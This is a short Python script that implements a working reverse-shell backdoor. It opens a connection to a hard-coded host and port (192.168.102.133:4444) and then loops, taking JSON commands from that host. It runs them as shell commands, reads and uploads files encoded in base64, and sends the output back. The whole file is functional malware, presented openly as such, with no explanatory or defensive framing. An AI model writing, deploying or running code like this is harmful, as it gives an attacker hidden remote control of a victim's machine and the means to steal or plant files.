#!/usr/bin/env python
import os
import socket
import  subprocess
import json
import base64
import sys



class Backdoor:
    def __init__(self,ip,port):
        self.connection =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload sucessful."

    def execute_sys_command(self,command):
        DEVNULL = open(os.devnull,'wb')
        return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
    def change_working_dir(self,path):
        os.chdir(path)
        return "[+] changing working directory to " + path


    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_dir(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_sys_command(command).decode()
            except Exception:
                command_result = "[-] error during execution"

            self.reliable_send(command_result)



my_backdoor = Backdoor("192.168.102.133",4444)
my_backdoor.run()